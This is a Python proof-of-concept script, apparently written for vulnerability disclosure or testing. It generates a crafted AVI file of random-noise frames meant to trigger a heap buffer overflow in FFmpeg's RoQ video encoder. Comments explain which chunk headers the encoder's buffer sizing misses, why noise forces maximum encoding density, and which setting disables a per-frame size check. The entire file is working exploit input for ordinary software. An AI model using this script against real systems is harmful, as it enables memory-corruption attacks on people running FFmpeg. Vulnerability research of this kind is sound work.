#!/usr/bin/env python3
"""
PoC generator for VULN-001: Heap Buffer Overflow in FFmpeg roqvideoenc.c
roq_encode_frame() does not account for:
  - 8-byte RoQ_QUAD_CODEBOOK chunk header written by write_codebooks() when numCB2 > 0
  - 16-byte RoQ_INFO info chunk written on first frame by roq_write_video_info_chunk()

We craft an AVI with high-entropy uncompressed BGR24 video to force the RoQ encoder
to use maximum codebook entries (numCB2=256, numCB4=256), triggering the overflow.
"""

import struct
import random
import os
import sys

def make_avi(filename, width=256, height=256, num_frames=3):
    """
    Build a minimal AVI file with uncompressed BGR24 video at the given resolution.
    The frame data uses maximum-entropy pixel patterns to force RoQ codebook saturation.
    """
    # AVI requires both dimensions to be multiples of 8 for RoQ encoding
    assert width % 8 == 0 and height % 8 == 0

    fps = 30
    micro_sec_per_frame = 1_000_000 // fps
    frame_size = width * height * 3  # BGR24

    # ---- Build frame data ----
    # Use truly random noise for each frame to maximise VQ distortion at the 4x4
    # CB4 level. With random noise, the VQ-generated CB4 entries (averages of
    # clusters) differ from each block's individually-optimal CB2 combination,
    # making CB2/CCC mode dominant over CB4/SLD mode in the rate-distortion
    # optimizer.  This maximises encoded bits per block, approaching the 138-bit
    # theoretical maximum per 8x8 block and triggering the buffer overflow.
    rng = random.Random(42)
    frames = []
    for f in range(num_frames):
        # os.urandom gives cryptographic-quality random bytes — maximum entropy
        pixels = bytearray(os.urandom(frame_size))
        frames.append(bytes(pixels))

    # ---- chunk helpers ----
    def fourcc(s):
        return s.encode('ascii') if isinstance(s, str) else s

    def chunk(fcc, data):
        d = data if isinstance(data, (bytes, bytearray)) else bytes(data)
        # chunks are word-padded (pad to even size)
        padded = d + (b'\x00' if len(d) % 2 else b'')
        return fourcc(fcc) + struct.pack('<I', len(d)) + padded

    def list_chunk(fcc, subtype, *children):
        inner = fourcc(subtype) + b''.join(children)
        return fourcc('LIST') + struct.pack('<I', len(inner)) + inner

    # ---- avih (main AVI header, 56 bytes) ----
    flags = 0x10  # AVIF_HASINDEX
    avih_data = struct.pack('<IIIIIIIIIIIIII',
        micro_sec_per_frame,   # dwMicroSecPerFrame
        frame_size * fps,      # dwMaxBytesPerSec
        0,                     # dwPaddingGranularity
        flags,                 # dwFlags
        num_frames,            # dwTotalFrames
        0,                     # dwInitialFrames
        1,                     # dwStreams
        frame_size,            # dwSuggestedBufferSize
        width,                 # dwWidth
        height,                # dwHeight
        0, 0, 0, 0,            # reserved[4]
    )
    avih_chunk = chunk('avih', avih_data)

    # ---- strh (stream header, 56 bytes) ----
    strh_data = (
        b'vids'                      # fccType
        + b'DIB '                    # fccHandler (uncompressed)
        + struct.pack('<IHHIIIIIII',
            0,                       # dwFlags
            0,                       # wPriority
            0,                       # wLanguage
            0,                       # dwInitialFrames
            1,                       # dwScale
            fps,                     # dwRate (frames per second)
            0,                       # dwStart
            num_frames,              # dwLength
            frame_size,              # dwSuggestedBufferSize
            0xFFFFFFFF,              # dwQuality (-1 = default)
        )
        + struct.pack('<I', 0)       # dwSampleSize
        + struct.pack('<HHHH', 0, 0, width, height)  # rcFrame
    )
    strh_chunk = chunk('strh', strh_data)

    # ---- strf (BITMAPINFOHEADER, 40 bytes) ----
    strf_data = struct.pack('<IiiHHIIiiII',
        40,            # biSize
        width,         # biWidth
        -height,       # biHeight (negative = top-down)
        1,             # biPlanes
        24,            # biBitCount (BGR24)
        0,             # biCompression (BI_RGB)
        frame_size,    # biSizeImage
        0,             # biXPelsPerMeter
        0,             # biYPelsPerMeter
        0,             # biClrUsed
        0,             # biClrImportant
    )
    strf_chunk = chunk('strf', strf_data)

    strl = list_chunk('strl', 'strl'[0:0], strh_chunk + strf_chunk)
    # list_chunk prepends LIST+size+subtype; rebuild manually since subtype='strl'
    strl_inner = b'strl' + strh_chunk + strf_chunk
    strl_list = b'LIST' + struct.pack('<I', len(strl_inner)) + strl_inner

    hdrl_inner = b'hdrl' + avih_chunk + strl_list
    hdrl_list = b'LIST' + struct.pack('<I', len(hdrl_inner)) + hdrl_inner

    # ---- movi ----
    frame_chunks = []
    frame_offsets = []  # offsets from start of movi data (after 'movi' fourcc)
    movi_inner = b'movi'
    for f_data in frames:
        frame_offsets.append(len(movi_inner))
        fc = b'00dc' + struct.pack('<I', len(f_data)) + f_data
        # pad if odd
        if len(f_data) % 2:
            fc += b'\x00'
        movi_inner += fc

    movi_list = b'LIST' + struct.pack('<I', len(movi_inner)) + movi_inner

    # ---- idx1 ----
    # Offsets in idx1 are relative to start of movi_inner (after 'movi' fourcc)
    # In practice many tools use offset from start of movi LIST data area
    idx1_data = b''
    for i, off in enumerate(frame_offsets):
        idx1_data += b'00dc'
        idx1_data += struct.pack('<III',
            0x10,          # AVIIF_KEYFRAME
            off,           # offset from start of 'movi' fourcc
            frame_size,    # size of chunk data
        )
    idx1_chunk = b'idx1' + struct.pack('<I', len(idx1_data)) + idx1_data

    # ---- Assemble RIFF ----
    riff_data = b'AVI ' + hdrl_list + movi_list + idx1_chunk
    riff = b'RIFF' + struct.pack('<I', len(riff_data)) + riff_data

    with open(filename, 'wb') as f:
        f.write(riff)

    print(f"[+] Written {filename}: {len(riff)} bytes, {num_frames} frame(s) of {width}x{height} BGR24")


if __name__ == '__main__':
    out = 'vuln_001_input.avi'
    if len(sys.argv) > 1:
        out = sys.argv[1]
    # Use 512x512 so that 16384 four-by-four blocks are clustered into only 256 CB4
    # entries (64 blocks per cluster). The cluster centroid is an average of 64
    # random blocks -> very grey/blurry -> far from any individual block's optimal
    # CB2 assignments -> dist_SLD >> dist_CCC for all blocks -> CCC mode on ALL
    # blocks -> maximum encoding density (70656 bytes) -> 24-byte buffer overflow.
    # (quake3_compat=0 is needed to disable the 65535-byte per-frame size check.)
    make_avi(out, width=512, height=512, num_frames=2)
